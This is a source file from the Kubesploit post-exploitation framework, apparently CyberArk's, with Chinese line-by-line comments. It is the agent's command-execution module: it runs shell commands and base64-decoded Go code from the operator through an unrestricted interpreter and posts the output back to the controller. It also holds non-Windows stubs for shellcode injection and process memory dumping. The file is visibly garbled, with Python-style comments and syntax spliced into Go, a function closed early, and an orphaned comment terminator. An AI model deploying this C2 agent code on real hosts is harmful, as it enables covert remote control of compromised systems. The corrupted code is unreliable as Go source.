# `kubesploit\pkg\agent\exec.go`

```
// +build !windows
// 指定该文件在非 Windows 系统下编译

// Kubesploit is a post-exploitation command and control framework built on top of Merlin by Russel Van Tuyl.
// This file is part of Kubesploit.
// Kubesploit 是一个基于 Russel Van Tuyl 的 Merlin 框架构建的后渗透命令和控制框架。
// 本文件是 Kubesploit 的一部分。

// Copyright (c) 2021 CyberArk Software Ltd. All rights reserved.
// 版权所有 2021 CyberArk Software Ltd.

// Kubesploit is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// any later version.
// Kubesploit 是自由软件：您可以根据由自由软件基金会发布的 GNU 通用公共许可证的条款重新分发或修改它，无论是许可证的第 3 版还是任何后续版本。

// Kubesploit is distributed in the hope that it will be useful for enhancing organizations' security.
// Kubesploit shall not be used in any malicious manner.
// Kubesploit 以期望它能够有助于增强组织的安全性而进行分发。
// Kubesploit 不得以任何恶意方式使用。

// Kubesploit is distributed AS-IS, WITHOUT ANY WARRANTY; including the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
// Kubesploit 按原样分发，不附带任何保证；包括对适销性或特定用途的隐含保证。请参阅 GNU 通用公共许可证以获取更多详细信息。

// You should have received a copy of the GNU General Public License
// along with Kubesploit.  If not, see <http://www.gnu.org/licenses/>.
// 您应该已经收到了 GNU 通用公共许可证的副本，连同 Kubesploit 一起。如果没有，请访问 <http://www.gnu.org/licenses/>。
// 导入 agent 包
package agent

// 导入标准库和第三方库
import (
	"bufio"  // 用于缓冲读取
	b64 "encoding/base64"  // 用于 base64 编码解码
	"github.com/mattn/go-shellwords"  // 用于解析命令行参数
	"github.com/traefik/yaegi/stdlib/unrestricted"  // 用于导入 yaegi 标准库中的 unrestricted 包
	"kubesploit/pkg/messages"  // 导入自定义的 messages 包
	"runtime"  // 用于访问 Go 运行时环境的信息
	"time"  // 用于处理时间

	// 标准库
	"errors"  // 用于处理错误
	"fmt"  // 用于格式化输入输出
	"github.com/traefik/yaegi/interp"  // 用于提供 yaegi 解释器
	"github.com/traefik/yaegi/stdlib"  // 用于导入 yaegi 标准库
	"github.com/traefik/yaegi/stdlib/unsafe"  // 用于导入 yaegi 标准库中的 unsafe 包
	"io/ioutil"  // 用于读取文件内容
	"os"  // 用于操作文件和目录
	"os/exec"  // 用于执行外部命令
)
// https://github.com/containous/yaegi/blob/f19b7563ea92b5c467c9e5e325a0a5b559712473/interp/interp_file_test.go
// ExecuteCommandGoInterpreter是一个函数，用于指示代理通过Go解释器（"yeagi"）在主机操作系统上执行Go代码
func ExecuteCommandGoInterpreter(name string, args []string) (stdout string, stderr string) {
    /*
    argS, errS := shellwords.Parse(arg)
    if errS != nil {
        return "", fmt.Sprintf("There was an error parsing command line argments: %s\r\n%s", arg, errS.Error())
    }*/

    // 备份标准输出，以便后续恢复
    backupStdout := os.Stdout
    defer func() { os.Stdout = backupStdout }()
    // 创建管道，将标准输出重定向到管道中
    r, w, _ := os.Pipe()
    os.Stdout = w
    // 创建一个新的解释器实例
    i := interp.New(interp.Options{})
    // 使用解释器的符号
    i.Use(interp.Symbols)
    // 使用标准库的符号
    i.Use(stdlib.Symbols)
}
	// 使用 unsafe.Symbols 和 unrestricted.Symbols
	i.Use(unsafe.Symbols)
	i.Use(unrestricted.Symbols)

	// 对 name 进行 base64 解码
	uDec, err := b64.StdEncoding.DecodeString(name)
	if err == nil {
		name = string(uDec)
	}

	// 在执行 Eval 之前检查 stderr
	_, err = i.Eval(name)
	if err != nil {
		stderr = err.Error()
	}

	// 对 args 中的每个参数进行 base64 解码
	for _, arg := range(args) {
		uDec, err := b64.StdEncoding.DecodeString(arg)
		if err == nil {
			arg = string(uDec)
		}
		// 使用 Eval 方法对参数进行求值，将结果赋值给 _，错误赋值给 err
		_, err = i.Eval(arg)
		// 如果有错误，将错误信息赋值给 stderr
		if err != nil {
			stderr = err.Error()
		}
	}

	// 读取标准输出
	// 关闭管道
	if err = w.Close(); err != nil {
		// 如果关闭管道出现错误，将错误信息添加到 stderr
		stderr += "; Failed to close the pipe: " + err.Error()
	}
	// 读取管道中的数据
	outInterp, err := ioutil.ReadAll(r)

	// 如果读取出现错误，将错误信息添加到 stderr
	if err != nil {
		stderr += "; Failed to read ioutil: " + err.Error()
	}

	// 将读取的数据转换为字符串，赋值给 stdout
	stdout = string(outInterp)
	// 返回 stdout 和 stderr
	return stdout, stderr
}
// ExecuteCommandGoInterpreterProgress 执行命令的Go解释器进度
// name: 命令名称
// args: 命令参数
// result: 命令结果
// returnMessage: 返回消息
// agent: 代理
// 返回标准输出和标准错误
func ExecuteCommandGoInterpreterProgress(name string, args []string, result messages.CmdResults, returnMessage messages.Base, agent *Agent) (stdout string, stderr string) {
    // 解析命令行参数
    // argS, errS := shellwords.Parse(arg)
    // if errS != nil {
    //     return "", fmt.Sprintf("There was an error parsing command line argments: %s\r\n%s", arg, errS.Error())
    // }

    var ttyName string
    // 根据操作系统选择tty名称
    if runtime.GOOS == "windows" {
        fmt.Println("*** Using `con`")
        ttyName = "con"
    } else {
        fmt.Println("*** Using `/dev/tty`")
        ttyName = "/dev/tty"
    }

    // 打开tty设备文件
    f, err := os.OpenFile(ttyName, os.O_WRONLY, 0644)
    if err != nil {
	// 如果发生错误，立即终止程序并打印错误信息
	panic(err)
	// 延迟关闭文件
	defer f.Close()
	// 创建一个管道，用于重定向标准输出
	r, w, _ := os.Pipe()
	// 保存旧的标准输出
	oldStdout := os.Stdout
	// 将标准输出重定向到管道
	os.Stdout = w
	// 延迟恢复原来的标准输出，并发送消息
	defer func() {
		os.Stdout = oldStdout
		//result.Stdout = "*** DONE ***"
		//returnMessage.Payload = result
		//agent.sendMessage("post", returnMessage)
	}()
	// 向文件中写入重定向后的标准输出信息
	fmt.Fprintln(f, "*** Stdout redirected")
	// 恢复标准输出
	//os.Stdout = w
	// 创建一个新的解释器
	//i := interp.New(interp.Options{GoPath: build.Default.GOPATH})
// 创建一个新的解释器实例
i := interp.New(interp.Options{})

// 使用标准符号
i.Use(interp.Symbols)

// 使用标准库符号
i.Use(stdlib.Symbols)

// 使用不安全符号
i.Use(unsafe.Symbols)

// 使用不受限制的符号
i.Use(unrestricted.Symbols)

// 使用标准 Base64 编码对字符串进行解码
uDec, err := b64.StdEncoding.DecodeString(name)
if err == nil {
    name = string(uDec)
}

// 读取文件内容并打印
//dat, err := ioutil.ReadFile(name)
//fmt.Print(string(dat))

// 在执行命令之前检查标准错误
go func(){
    // 执行解释器中的命令
    i.Eval(name)
    //i.Eval(args[0])
# 遍历参数列表
for _, arg := range(args) {
    # 尝试对参数进行 base64 解码
    uDec, err := b64.StdEncoding.DecodeString(arg)
    # 如果解码成功，将解码后的字符串赋值给参数
    if err == nil {
        arg = string(uDec)
    }
    # 对参数进行求值
    _, err = i.Eval(arg)
    # 如果出现错误，将错误信息赋值给 stderr
    if err != nil {
        stderr = err.Error()
    }
}
# 休眠 4000 毫秒，给扫描器足够的时间进行扫描
time.Sleep(4000 * time.Millisecond)
# 关闭写入器
w.Close()
# 关闭读取器
r.Close()
# 启动一个匿名 goroutine，并向通道 c 发送一个空结构体
go func(){c <- struct{}{}}()
# 在函数返回时关闭通道 c
defer close(c)
# 创建一个新的扫描器，用于从输入流中读取数据
scanner := bufio.NewScanner(r)
# 设置返回消息的类型为"CmdResults"
returnMessage.Type = "CmdResults"
# 循环读取输入流中的每一行数据
for scanner.Scan() {
    # 获取当前行的文本内容
    m := scanner.Text()
    # 将当前行的内容写入到输出流中
    fmt.Fprintln(f, "output: " + m)

    # 将当前行的内容转换为字符串，并赋值给result.Stdout
    result.Stdout = string(m)
    # 将result作为负载赋值给返回消息
    returnMessage.Payload = result
    # 通过agent发送post请求，携带返回消息
    agent.sendMessage("post", returnMessage)
}

# 执行i.Eval(name)的操作，但是注释掉了
# 如果发生错误，将错误信息赋值给stderr
# 注释掉的代码块
# 遍历参数列表
for _, arg := range(args) {
    # 尝试对参数进行 base64 解码
    uDec, err := b64.StdEncoding.DecodeString(arg)
    # 如果解码成功，将解码后的字符串赋值给参数
    if err == nil {
        arg = string(uDec)
    }
    # 对参数进行求值
    _, err = i.Eval(arg)
    # 如果出现错误，将错误信息赋值给 stderr
    if err != nil {
        stderr = err.Error()
    }
}

# 无限循环
for {
    # 创建一个字符串类型的通道
    outC := make(chan string)
    # 启动一个 goroutine
    go func() {
        # 创建一个字节缓冲区
        var buf bytes.Buffer
        # 将输入流的内容拷贝到缓冲区
        io.Copy(&buf, r)
        # 将缓冲区的内容转换为字符串并发送到通道
        outC <- buf.String()
			// 匿名函数调用，用于处理命令执行结果
			}()

			// 恢复正常状态
			w.Close()
			os.Stdout = backupStdout
			out := <-outC
			//out, _ := ioutil.ReadAll(r)

			//out := <-outC

			// 设置返回消息类型为 "CmdResults"
			returnMessage.Type = "CmdResults"
			// 将命令执行结果转换为字符串，并赋值给 result.Stdout
			result.Stdout = string(out)
			// 将结果作为负载赋值给返回消息
			returnMessage.Payload = result
			// 发送返回消息给代理
			agent.sendMessage("post", returnMessage)
		}

		// 恢复真实的标准输出
		os.Stdout = backupStdout 
		// 读取标准输出
		if err = w.Close(); err != nil {
		// 将错误信息添加到 stderr 变量中
		stderr += "; Failed to close the pipe: " + err.Error()
		// 读取管道中的数据
		outInterp, err := ioutil.ReadAll(r)

		// 如果读取数据时发生错误，将错误信息添加到 stderr 变量中
		if err != nil {
			stderr += "; Failed to read ioutil: " + err.Error()
		}

	*/
	// 打印 outInterp 变量的内容
	//fmt.Print(string(outInterp))
	// 将 outInterp 变量的内容赋值给 stdout 变量

	// 返回 stdout 和 stderr 变量的值
	return stdout, stderr
}
// 执行命令并返回标准输出和标准错误
func ExecuteCommand(name string, arg string) (stdout string, stderr string) {
	var cmd *exec.Cmd

	// 解析命令行参数
	argS, errS := shellwords.Parse(arg)
	// 如果解析参数时发生错误，返回错误信息
	if errS != nil {
		return "", fmt.Sprintf("There was an error parsing command line argments: %s\r\n%s", arg, errS.Error())
	}

	// 使用给定的命令和参数创建一个执行命令的对象
	cmd = exec.Command(name, argS...) // #nosec G204

	// 执行命令并获取输出
	out, err := cmd.CombinedOutput()
	stdout = string(out)
	stderr = ""

	// 如果有错误，将错误信息存储到 stderr 中
	if err != nil {
		stderr = err.Error()
	}

	// 返回命令执行的标准输出和标准错误输出
	return stdout, stderr
}

// ExecuteCommandScriptInCommands 是一个函数，用于指示代理在主机操作系统上执行命令
func ExecuteCommandScriptInCommands(name string, arg string) (stdout string, stderr string) {
	var cmd *exec.Cmd

	// 将参数解析为字符串切片
	argS, errS := shellwords.Parse(arg)
# 如果解析命令行参数出现错误，则返回错误信息
if errS != nil:
    return "", fmt.Sprintf("There was an error parsing command line argments: %s\r\n%s", arg, errS.Error())

# 根据命令行参数的长度进行不同的处理
switch argSLen := len(argS);{
    # 如果参数长度大于2，则进行以下操作
    case argSLen > 2:
        # 在参数列表末尾添加两个空字符串
        argS = append(argS,[]string{"",""}...)
        # 将参数列表中的元素向后移动两位
        copy(argS[4:],argS[2:])
        # 在指定位置插入name和"_"
        argS[2]=name
        argS[3]="_"
        # 创建一个exec.Cmd对象，用于执行命令
        cmd = exec.Command(argS[0],argS[1:]...)
    # 如果参数长度等于2，则进行以下操作
    case argSLen == 2:
        # 创建一个exec.Cmd对象，用于执行命令，同时忽略安全检查
        cmd = exec.Command(argS[0],argS[1],name) // #nosec G204
    # 如果参数长度小于2，则返回错误信息
    case argSLen < 2:
        return "","Modules with source code must run with at lease 2 commands: sh -c"

# 执行命令并获取标准输出和标准错误
out, err := cmd.CombinedOutput()
# 将标准输出转换为字符串
stdout = string(out)
# 清空标准错误
stderr = ""
// 如果发生错误，将错误信息赋值给 stderr
if err != nil {
	stderr = err.Error()
}

// 返回标准输出和标准错误信息
return stdout, stderr
}

// 在当前进程中执行提供的 shellcode
//lint:ignore SA4009 函数需要与 exec_windows.go 保持一致，并且必须使用输入
func ExecuteShellcodeSelf(shellcode []byte) error {
	shellcode = nil
	// 返回一个错误，表示在该操作系统下未实现 shellcode 执行
	return errors.New("shellcode execution is not implemented for this operating system")
}

// 在提供的目标进程中执行提供的 shellcode
//lint:ignore SA4009 函数需要与 exec_windows.go 保持一致，并且必须使用输入
func ExecuteShellcodeRemote(shellcode []byte, pid uint32) error {
	shellcode = nil
	pid = 0
	// 返回一个错误，表示在该操作系统下未实现 shellcode 执行
	return errors.New("shellcode execution is not implemented for this operating system")
}
// ExecuteShellcodeRtlCreateUserThread 函数使用 Windows 的 RtlCreateUserThread 调用在提供的目标进程中执行提供的 shellcode
//lint:ignore SA4009 函数需要镜像 exec_windows.go，并且必须使用输入
func ExecuteShellcodeRtlCreateUserThread(shellcode []byte, pid uint32) error {
    shellcode = nil
    pid = 0
    return errors.New("shellcode execution is not implemented for this operating system")
}

// ExecuteShellcodeQueueUserAPC 函数使用 Windows 的 QueueUserAPC API 调用在提供的目标进程中执行提供的 shellcode
//lint:ignore SA4009 函数需要镜像 exec_windows.go，并且必须使用输入
func ExecuteShellcodeQueueUserAPC(shellcode []byte, pid uint32) error {
    shellcode = nil
    pid = 0
    return errors.New("shellcode execution is not implemented for this operating system")
}

// miniDump 是一个仅在 Windows 系统下可用的模块函数，用于转储提供的进程的内存
//lint:ignore SA4009 函数需要镜像 exec_windows.go，并且必须使用输入
# 定义一个名为miniDump的函数，接受tempDir（临时目录）、process（进程名称）和inPid（进程ID）三个参数，返回一个包含字符串和接口类型的字典和一个错误对象
func miniDump(tempDir string, process string, inPid uint32) (map[string]interface{}, error) {
    # 声明一个名为mini的空字典
    var mini map[string]interface{}
    # 将tempDir、process和inPid的值分别设置为空字符串、空字符串和0
    tempDir = ""
    process = ""
    inPid = 0
    # 返回一个空的mini字典和一个包含错误信息的错误对象，说明在非Windows主机上无法使用minidump
    return mini, errors.New("minidump doesn't work on non-windows hosts")
}
```